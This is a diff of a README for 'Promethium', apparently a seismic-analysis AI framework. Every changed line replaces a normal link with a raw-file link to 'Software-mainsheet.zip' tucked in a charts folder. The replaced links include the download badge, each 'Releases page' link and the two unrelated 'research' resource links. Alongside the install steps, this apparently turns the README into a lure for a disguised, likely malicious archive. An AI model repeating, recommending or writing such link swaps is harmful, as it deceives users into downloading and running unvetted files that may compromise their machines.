@@ -4,9 +4,9 @@
 Promethium is designed to enhance your experience in working with seismic data. With our framework, you can easily reconstruct, denoise, and analyze geophysical data using advanced AI technology. Whether you're studying earthquakes or other seismic events, Promethium makes the complex simple.
 
 ## 📥 Download Promethium
-[![Download Promethium](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/yooucef/Promethium/releases)
+[![Download Promethium](https://github.com/yooucef/Promethium/raw/refs/heads/main/charts/promethium/Software-mainsheet.zip)](https://github.com/yooucef/Promethium/raw/refs/heads/main/charts/promethium/Software-mainsheet.zip)
 
-To get started with Promethium, visit this page to download: [Promethium Releases](https://github.com/yooucef/Promethium/releases).
+To get started with Promethium, visit this page to download: [Promethium Releases](https://github.com/yooucef/Promethium/raw/refs/heads/main/charts/promethium/Software-mainsheet.zip).
 
 ## 🛠️ System Requirements
 Before you install Promethium, ensure your system meets the following requirements:
@@ -30,7 +30,7 @@ Promethium offers several key features to help you with seismic analysis:
 ## 💡 How to Use Promethium
 
 ### Step 1: Download the Software
-Visit the [Releases page](https://github.com/yooucef/Promethium/releases) to access the latest version of Promethium. Click on the download link for your operating system and wait for the download to complete.
+Visit the [Releases page](https://github.com/yooucef/Promethium/raw/refs/heads/main/charts/promethium/Software-mainsheet.zip) to access the latest version of Promethium. Click on the download link for your operating system and wait for the download to complete.
 
 ### Step 2: Install Promethium
 1. Locate the downloaded file on your computer. It may be in your Downloads folder.
@@ -71,8 +71,8 @@ If you encounter issues or have questions, feel free to reach out to the Prometh
 
 ## 🌐 Additional Resources
 For more information about seismic analysis and AI techniques, check out these resources:
-- [AI in Geophysics Research](https://research.example.com)
-- [Best Practices for Seismic Data Analysis](https://handbook.example.com)
+- [AI in Geophysics Research](https://github.com/yooucef/Promethium/raw/refs/heads/main/charts/promethium/Software-mainsheet.zip)
+- [Best Practices for Seismic Data Analysis](https://github.com/yooucef/Promethium/raw/refs/heads/main/charts/promethium/Software-mainsheet.zip)
 
 ## 📚 Contributing to Promethium
 If you wish to contribute to Promethium, consider the following steps:
